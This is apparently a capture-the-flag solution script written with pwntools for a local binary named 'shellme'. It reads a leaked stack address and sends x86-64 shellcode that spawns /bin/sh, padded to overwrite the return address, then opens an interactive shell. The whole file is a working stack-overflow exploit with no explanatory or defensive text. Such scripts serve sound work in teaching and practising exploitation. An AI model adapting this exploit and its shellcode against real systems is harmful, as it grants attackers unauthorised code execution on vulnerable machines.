from pwn import*
context(os='linux')
context.log_level = 'DEBUG'
e =ELF("./shellme")
io = process(e.path)
io.recvuntil("0x")
v5_addr = int(io.recvline(), 16)
print v5_addr
shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload=shellcode+(0x24+4-len(shellcode))*'a'+p64(v5_addr)
io.sendline(payload)
io.interactive()